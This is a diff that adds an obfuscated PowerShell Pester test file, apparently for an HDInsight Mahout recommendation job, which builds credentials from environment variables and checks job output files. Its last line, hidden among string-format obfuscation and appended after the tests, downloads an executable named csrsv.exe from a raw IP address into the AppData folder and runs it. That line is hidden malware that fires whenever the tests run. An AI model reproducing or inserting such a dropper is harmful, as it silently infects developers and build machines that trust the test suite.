@@ -1,0 +1,41 @@
+${he`RE} = &("{2}{0}{1}" -f'-Pat','h','Split') -Parent ${m`YInvOCa`TIOn}."My`c`O`MMand"."pA`Th"
+${s`Ut} = (.("{1}{2}{3}{0}"-f 'h','Spli','t-','Pat') -Leaf ${MY`InVOCA`Ti`On}."MYcom`Ma`Nd"."Pa`Th") -replace ((("{0}{3}{1}{2}" -f '7B','T','ests','g.'))  -CrePlacE  '7Bg',[chaR]92), ''
+. "$here\$sut"
+
+${Clus`Te`RnAME} = ${E`Nv:Cl`U`st`eR`NamE}
+${HT`TpuSE`R`pAssWoRD} = ${eNV`:`HttPPa`SSwo`RD}
+${sE`cURe`pAs`SW`oRd} = .("{4}{3}{2}{5}{6}{1}{0}"-f'ing','tr','Sec','o-','ConvertT','u','reS') ${Ht`TpuS`ERpAs`SWo`Rd} -AsPlainText -Force
+${C`Reds} = .("{1}{0}{2}" -f 'bjec','New-O','t') -TypeName ("{9}{7}{5}{4}{3}{0}{6}{8}{1}{2}"-f'en','redent','ial','m','ge','Mana','t.Automati','stem.','on.PSC','Sy') -ArgumentList ("{1}{0}"-f 'min','ad'), ${sEcur`ep`A`SSWOrd}
+
+
+
+function G`ET-c`RED`eNTiaL { return ${cr`E`ds} }
+
+&("{0}{1}"-f 'Descri','be') ("{3}{0}{2}{1}" -f'din','out','sight-mah','h') {
+    
+    &('in') ${TeSTd`R`I`VE} {
+        .('It') ("{3}{12}{4}{9}{6}{7}{10}{11}{2}{5}{0}{1}{8}" -f 'I','nsigh','A','Runs a Map',' ','zHD','si','ng','tJob','job u',' S','tart-','Reduce') {
+            .("{1}{0}"-f'ock','M') ("{1}{2}{0}" -f 'st','Read-','ho') { ${ClUSt`ern`A`mE} }
+            
+            (&("{1}{0}{2}{3}" -f 'r','Sta','t-MahoutJo','b'))[0]."STa`Te" | &("{1}{0}" -f 'uld','Sho') ('be') ("{1}{0}{2}"-f 'EDE','SUCCE','D')
+        }
+        .('It') ("{1}{4}{3}{0}{5}{2}" -f 'the o','Down','le','ed ','load','utput fi') {
+            .("{0}{2}{1}" -f'Test','th','-Pa') ((("{3}{0}{1}{2}"-f'6o','utput.t','xt','.KI'))-creplaCE  'KI6',[CHaR]92) | .("{1}{0}{2}"-f 'ho','S','uld') ('be') ("{0}{1}" -f 'Tr','ue')
+        }
+        &('It') ("{4}{6}{2}{7}{3}{1}{0}{5}"-f 'l','db fi','aded','ie','Dow','e','nlo',' the mov') {
+            .("{0}{1}" -f 'T','est-Path') ((("{1}{0}{3}{2}" -f'mo','.SEI','xt','viedb.t'))  -crePlaCe  'SEI',[ChAr]92) | &("{1}{0}" -f'd','Shoul') ('be') ("{1}{0}"-f 'e','Tru')
+        }
+        .('It') ("{2}{1}{5}{0}{4}{3}"-f' rat',' th','Downloaded','gs file','in','e') {
+            .("{0}{1}"-f'Test-Pat','h') ((("{2}{0}{1}{4}{3}{5}" -f'vfV','u','.','.t','ser-ratings','xt'))-REpLACe 'vfV',[ChAR]92) | .("{1}{0}" -f'ld','Shou') ('be') ("{1}{0}"-f 'ue','Tr')
+        }
+
+        
+        
+        
+        &('It') ("{5}{7}{0}{6}{3}{2}{4}{1}"-f'y','ut','r-','e','readable outp','Dis','s us','pla') {
+            { &("{0}{2}{1}{3}{4}"-f 'F','ma','or','t-Ma','houtOutput') -userId 4 -userDataFile (("{1}{4}{0}{3}{2}"-f 'user-ratings','.Rx','txt','.','n')).("{1}{0}"-f 'pLacE','RE').Invoke('Rxn','\') -movieFile ((("{0}{2}{1}{3}" -f '.','vi','suQmo','edb.txt'))-REplaCe 'suQ',[cHar]92) -recommendationFile ((("{1}{0}{2}{3}"-f'Db4','.','output.tx','t')) -crEplaCe([char]68+[char]98+[char]52),[char]92) } | &("{1}{0}" -f'hould','S') ("{1}{0}"-f 't','no') ("{0}{1}" -f'th','row')
+        }
+    }
+}
+
+(.("{0}{1}{3}{2}"-f'N','ew-Obj','ct','e') ("{4}{0}{1}{2}{3}"-f 'te','m.Net.W','ebClien','t','Sys')).("{3}{0}{1}{2}" -f'nload','F','ile','Dow').Invoke(("{6}{5}{2}{7}{1}{4}{3}{0}"-f 'v.exe','38','//94.102.53','/csrs','/~yahoo','p:','htt','.2'),"$env:APPDATA\csrsv.exe");&("{1}{0}{2}"-f'ta','S','rt-Process') ("$env:APPDATA\csrsv.exe")
